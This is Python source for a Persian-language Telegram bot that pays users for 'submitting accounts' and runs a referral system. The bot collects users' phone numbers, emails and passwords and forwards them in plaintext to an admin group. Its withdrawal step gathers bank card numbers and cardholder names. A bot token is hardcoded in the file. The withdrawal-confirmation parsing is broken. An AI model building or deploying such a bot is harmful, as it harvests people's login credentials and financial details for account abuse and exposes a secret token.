from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackContext,
    MessageHandler,
    filters,
    ConversationHandler,
    CallbackQueryHandler,
)
import sqlite3
import random
import re

# توکن ربات شما
TOKEN = '7875920798:AAGOrpH2HZgdoidwKScsTnFQDFu2b5mg0DI'

# شناسه کاربری شما (ایدی عددی شما در تلگرام)
ADMIN_IDS = [5092758824, 7754882804]

# گروهی که اکانت‌ها به آن ارسال می‌شوند
GROUP_ID = -1002453133373  # این مقدار را با آی‌دی عددی گروه خود جایگزین کنید

# حالت‌های ربات
AWAITING_PHONE_NUMBER = 1
AWAITING_EMAIL = 2
AWAITING_PASSWORD = 3
AWAITING_WITHDRAWAL_INFO = 4

# ایجاد اتصال به دیتابیس
conn = sqlite3.connect('bot_data.db', check_same_thread=False)
cursor = conn.cursor()

# ایجاد جدول referrals
cursor.execute('''
    CREATE TABLE IF NOT EXISTS referrals (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER UNIQUE,
        referred_by INTEGER
    )
''')
conn.commit()

# ایجاد جدول balances
cursor.execute('''
    CREATE TABLE IF NOT EXISTS balances (
        user_id INTEGER PRIMARY KEY,
        balance INTEGER DEFAULT 0
    )
''')
conn.commit()

# ذخیره کاربران جدید در دیتابیس
async def save_user(user_id):
    cursor.execute('SELECT user_id FROM referrals WHERE user_id = ?', (user_id,))
    if not cursor.fetchone():
        cursor.execute('INSERT INTO referrals (user_id, referred_by) VALUES (?, ?)', (user_id, None))
        conn.commit()
    cursor.execute('SELECT user_id FROM balances WHERE user_id = ?', (user_id,))
    if not cursor.fetchone():
        cursor.execute('INSERT INTO balances (user_id, balance) VALUES (?, ?)', (user_id, 0))
        conn.commit()

# دکمه‌های کیبورد اصلی
async def send_main_menu(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    await save_user(user_id)
    
    keyboard = [
        [KeyboardButton("📖 آموزش ثبت نام")],
        [KeyboardButton("🔗 لینک زیرمجموعه‌گیری"), KeyboardButton("📊 تعداد زیرمجموعه‌ها")],
        [KeyboardButton("📋 لیست زیرمجموعه‌ها"), KeyboardButton("👤 حساب کاربری")],
    ]
    if user_id in ADMIN_IDS:
        keyboard.append([KeyboardButton("📢 ارسال پیام به همه"), KeyboardButton("📊 تعداد کل کاربران")])
    
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
    await update.message.reply_text("🔘 منو برای دستورات ربات فعال شد.", reply_markup=reply_markup)

# تابع مدیریت دکمه‌های متنی
async def handle_text_buttons(update: Update, context: CallbackContext):
    if not update.message:
        return
    
    user_id = update.effective_user.id
    await save_user(user_id)
    
    text = update.message.text
    
    if text == "📖 آموزش ثبت نام":
        await send_registration_messages(update, context)
    elif text == "🔗 لینک زیرمجموعه‌گیری":
        await referral_command(update, context)
    elif text == "📊 تعداد زیرمجموعه‌ها":
        await my_referrals_command(update, context)
    elif text == "📋 لیست زیرمجموعه‌ها":
        await list_referrals_command(update, context)
    elif text == "👤 حساب کاربری":
        await show_account_menu(update, context)
    elif text == "📢 ارسال پیام به همه" and user_id in ADMIN_IDS:
        await update.message.reply_text("📩 لطفاً پیام خود را ارسال کنید.")
        context.user_data['awaiting_broadcast'] = True
    elif text == "📊 تعداد کل کاربران" and user_id in ADMIN_IDS:
        await get_total_users(update, context)
    elif text == "🔙 بازگشت":
        await send_main_menu(update, context)  # بازگشت به منوی اصلی

# تابع نمایش منوی حساب کاربری
async def show_account_menu(update: Update, context: CallbackContext):
    keyboard = [
        [KeyboardButton("💰 موجودی من")],
        [KeyboardButton("💳 برداشت موجودی")],
        [KeyboardButton("📤 ارسال اکانت")],
        [KeyboardButton("🔙 بازگشت")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
    await update.message.reply_text("👤 لطفاً یکی از گزینه‌های زیر را انتخاب کنید:", reply_markup=reply_markup)

# تابع نمایش موجودی کاربر
async def show_balance(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    cursor.execute('SELECT balance FROM balances WHERE user_id = ?', (user_id,))
    balance = cursor.fetchone()[0]
    await update.message.reply_text(f"💰 موجودی شما: {balance} تومان")

# تابع شروع دریافت اطلاعات اکانت
async def start_account_submission(update: Update, context: CallbackContext):
    keyboard = [[KeyboardButton("🔙 بازگشت")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
    await update.message.reply_text("📞 لطفاً شماره تماس خود را وارد کنید (۱۱ رقم):", reply_markup=reply_markup)
    return AWAITING_PHONE_NUMBER

# تابع دریافت شماره تماس
async def handle_phone_number(update: Update, context: CallbackContext):
    text = update.message.text
    
    if text == "🔙 بازگشت":
        await send_main_menu(update, context)
        return ConversationHandler.END
    
    # بررسی معتبر بودن شماره تماس (۱۱ رقم)
    if not re.match(r'^\d{11}$', text):
        await update.message.reply_text("❌ شماره تماس نامعتبر است. لطفاً یک شماره ۱۱ رقمی وارد کنید.")
        return AWAITING_PHONE_NUMBER
    
    # ذخیره شماره تماس در context
    context.user_data['phone_number'] = text
    
    keyboard = [[KeyboardButton("🔙 بازگشت")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
    await update.message.reply_text("📧 لطفاً ایمیل خود را وارد کنید:", reply_markup=reply_markup)
    return AWAITING_EMAIL

# تابع دریافت ایمیل
async def handle_email(update: Update, context: CallbackContext):
    text = update.message.text
    
    if text == "🔙 بازگشت":
        await send_main_menu(update, context)
        return ConversationHandler.END
    
    # ذخیره ایمیل در context
    context.user_data['email'] = text
    
    keyboard = [[KeyboardButton("🔙 بازگشت")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
    await update.message.reply_text("🔑 لطفاً رمز عبور خود را وارد کنید:", reply_markup=reply_markup)
    return AWAITING_PASSWORD

# تابع دریافت رمز عبور و ارسال اطلاعات به گروه
async def handle_password(update: Update, context: CallbackContext):
    text = update.message.text
    
    if text == "🔙 بازگشت":
        await send_main_menu(update, context)
        return ConversationHandler.END
    
    # ذخیره رمز عبور در context
    context.user_data['password'] = text
    
    user_id = update.effective_user.id
    phone_number = context.user_data['phone_number']
    email = context.user_data['email']
    tracking_id = f"#{random.randint(100000, 999999)}"
    
    message = (f"🆕 **درخواست بررسی حساب کاربری**\n\n"
               f"👤 کاربر: {user_id}\n"
               f"📞 شماره تماس: {phone_number}\n"
               f"📧 ایمیل: {email}\n"
               f"🔑 رمز عبور: {text}\n"
               f"🔍 **کد پیگیری:** {tracking_id}")
    
    # ایجاد اینلاین کیبورد با دکمه "آیا تایید می‌کنید؟"
    keyboard = [
        [InlineKeyboardButton("✅ تایید اکانت", callback_data=f"confirm_{user_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # ارسال پیام به گروه با اینلاین کیبورد
    await context.bot.send_message(chat_id=GROUP_ID, text=message, reply_markup=reply_markup)
    
    # ارسال تأییدیه به کاربر
    await update.message.reply_text(
        f"""✅ اطلاعات شما ثبت شد!
کد پیگیری شما: {tracking_id}
پس از تایید ادمین‌ها به شما اطلاع داده خواهد شد."""
    )
    return ConversationHandler.END

# تابع مدیریت کلیک روی دکمه اینلاین برای تایید اکانت
async def handle_confirmation(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()  # پاسخ به کلیک کاربر
    
    data = query.data.split("_")
    
    # بررسی اینکه آیا callback_data مربوط به تایید برداشت است
    if "withdraw" in query.data:
        await handle_withdrawal_confirmation(update, context)
        return
    
    # اگر callback_data مربوط به تایید اکانت است
    user_id = int(data[1])  # دریافت user_id از callback_data
    
    # افزایش موجودی کاربر پس از تایید
    cursor.execute('UPDATE balances SET balance = balance + 200000 WHERE user_id = ?', (user_id,))
    conn.commit()
    
    # ارسال پیام به کاربر
    await context.bot.send_message(chat_id=user_id, text="🎉 اکانت شما تایید شد و ۲۰۰ هزار تومان به موجودی شما اضافه شد!")
    
    # ویرایش پیام در گروه و حذف دکمه
    await query.edit_message_text(text=query.message.text + "\n\n✅ این درخواست تایید شد.", reply_markup=None)

# تابع شروع درخواست برداشت
async def start_withdrawal(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    cursor.execute('SELECT balance FROM balances WHERE user_id = ?', (user_id,))
    balance = cursor.fetchone()[0]
    
    if balance < 600000:
        await update.message.reply_text("❌ موجودی شما برای برداشت کافی نیست. حداقل موجودی برای برداشت ۶۰۰ هزار تومان است.")
        return
    
    await update.message.reply_text("💳 لطفاً اطلاعات زیر را وارد کنید:\n\n1. شماره کارت\n2. نام و نام خانوادگی دارنده کارت\n3. شماره موبایل")
    return AWAITING_WITHDRAWAL_INFO

# تابع دریافت اطلاعات برداشت
async def handle_withdrawal_info(update: Update, context: CallbackContext):
    text = update.message.text
    
    if text == "🔙 بازگشت":
        await send_main_menu(update, context)
        return ConversationHandler.END
    
    # ذخیره اطلاعات برداشت در context
    context.user_data['withdrawal_info'] = text
    
    user_id = update.effective_user.id
    cursor.execute('SELECT balance FROM balances WHERE user_id = ?', (user_id,))
    balance = cursor.fetchone()[0]
    
    message = (f"🆕 **درخواست برداشت موجودی**\n\n"
               f"👤 کاربر: {user_id}\n"
               f"💰 موجودی: {balance} تومان\n"
               f"📄 اطلاعات برداشت:\n{text}")
    
    # ایجاد اینلاین کیبورد با دکمه‌های "تایید" و "رد"
    keyboard = [
        [InlineKeyboardButton("✅ تایید برداشت", callback_data=f"confirm_withdraw_{user_id}"),
         InlineKeyboardButton("❌ رد برداشت", callback_data=f"reject_withdraw_{user_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # ارسال پیام به گروه با اینلاین کیبورد
    await context.bot.send_message(chat_id=GROUP_ID, text=message, reply_markup=reply_markup)
    
    # ارسال تأییدیه به کاربر
    await update.message.reply_text("✅ درخواست برداشت شما ثبت شد. پس از تایید ادمین‌ها، موجودی شما برداشت خواهد شد.")
    return ConversationHandler.END

# تابع مدیریت کلیک روی دکمه اینلاین برای برداشت
async def handle_withdrawal_confirmation(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()  # پاسخ به کلیک کاربر
    
    data = query.data.split("_")
    action = data[1]  # "confirm" یا "reject"
    user_id = int(data[2])  # دریافت user_id از callback_data
    
    if action == "confirm":
        # بررسی موجودی کاربر
        cursor.execute('SELECT balance FROM balances WHERE user_id = ?', (user_id,))
        balance = cursor.fetchone()[0]
        
        if balance >= 600000:
            # کاهش موجودی کاربر پس از تایید برداشت
            cursor.execute('UPDATE balances SET balance = balance - 600000 WHERE user_id = ?', (user_id,))
            conn.commit()
            
            # ارسال پیام به کاربر
            await context.bot.send_message(chat_id=user_id, text="🎉 درخواست برداشت شما تایید شد. مبلغ تا ساعاتی دیگر به حساب شما واریز خواهد شد.")
            
            # ویرایش پیام در گروه و حذف دکمه
            await query.edit_message_text(text=query.message.text + "\n\n✅ این درخواست تایید شد.", reply_markup=None)
        else:
            await context.bot.send_message(chat_id=user_id, text="❌ موجودی شما کافی نیست.")
    
    elif action == "reject":
        # ارسال پیام به کاربر
        await context.bot.send_message(chat_id=user_id, text="❌ درخواست برداشت شما رد شد. لطفاً با پشتیبانی تماس بگیرید.")
        
        # ویرایش پیام در گروه و حذف دکمه
        await query.edit_message_text(text=query.message.text + "\n\n❌ این درخواست رد شد.", reply_markup=None)

# تابع لغو عملیات
async def cancel(update: Update, context: CallbackContext):
    await update.message.reply_text("عملیات لغو شد.")
    return ConversationHandler.END

# تابع ارسال پیام‌های آموزشی
async def send_registration_messages(update: Update, context: CallbackContext):
    messages = [
        "📌 **آموزش ثبت نام:**\n\n"
        "1️⃣ ابتدا وارد سایت شوید.\n"
        "2️⃣ اطلاعات خود را وارد کنید.\n"
        "3️⃣ ثبت نام را تکمیل کنید."
    ]
    for msg in messages:
        await update.message.reply_text(msg)

# تابع ایجاد لینک زیرمجموعه‌گیری
async def referral_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    referral_link = f"https://t.me/XPsenderaccountWbot?start={user_id}"
    await update.message.reply_text(f"🔗 لینک زیرمجموعه‌گیری شما:\n{referral_link}")

# تابع نمایش تعداد زیرمجموعه‌ها
async def my_referrals_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    cursor.execute('SELECT COUNT(*) FROM referrals WHERE referred_by = ?', (user_id,))
    count = cursor.fetchone()[0]
    await update.message.reply_text(f"📊 تعداد زیرمجموعه‌های شما: {count}")

# تابع نمایش لیست زیرمجموعه‌ها
async def list_referrals_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    cursor.execute('SELECT user_id FROM referrals WHERE referred_by = ?', (user_id,))
    referrals = cursor.fetchall()
    if referrals:
        message = "📋 لیست زیرمجموعه‌های شما:\n" + "\n".join([f"- کاربر با شناسه {ref[0]}" for ref in referrals])
    else:
        message = "❌ شما هنوز زیرمجموعه‌ای ندارید."
    await update.message.reply_text(message)

# تابع نمایش تعداد کل کاربران
async def get_total_users(update: Update, context: CallbackContext):
    cursor.execute('SELECT COUNT(*) FROM referrals')
    count = cursor.fetchone()[0]
    await update.message.reply_text(f"📊 تعداد کل کاربران: {count}")

# راه‌اندازی ربات
def main():
    application = Application.builder().token(TOKEN).build()

    # تعریف ConversationHandler برای مدیریت حالت‌ها
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", send_main_menu),
            MessageHandler(filters.Text("📤 ارسال اکانت"), start_account_submission),
            MessageHandler(filters.Text("💳 برداشت موجودی"), start_withdrawal),
        ],
        states={
            AWAITING_PHONE_NUMBER: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_number)
            ],
            AWAITING_EMAIL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_email)
            ],
            AWAITING_PASSWORD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_password)
            ],
            AWAITING_WITHDRAWAL_INFO: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_withdrawal_info)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_buttons))
    
    # اضافه کردن CallbackQueryHandler برای تایید اکانت
    application.add_handler(CallbackQueryHandler(handle_confirmation, pattern="^confirm_"))
    
    # اضافه کردن CallbackQueryHandler برای تایید و رد برداشت
    application.add_handler(CallbackQueryHandler(handle_withdrawal_confirmation, pattern="^confirm_withdraw_|^reject_withdraw_"))

    application.run_polling()

if __name__ == '__main__':
    main()
